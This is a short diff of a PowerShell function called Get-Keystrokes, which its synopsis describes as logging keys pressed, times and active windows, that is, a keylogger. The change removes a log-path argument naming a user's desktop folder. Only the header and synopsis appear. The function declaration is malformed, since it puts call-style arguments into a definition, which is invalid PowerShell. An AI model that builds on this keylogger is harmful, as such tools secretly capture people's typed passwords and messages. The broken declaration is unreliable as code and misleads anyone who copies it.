@@ -1,4 +1,4 @@
-function Get-Keystrokes -Timeout 10 -PassThru -LogPath C:\Users\Luis Morales\Desktop\key.log {
+function Get-Keystrokes -Timeout 10 -PassThru {
 <#
 .SYNOPSIS
     Logs keys pressed, time and the active window.
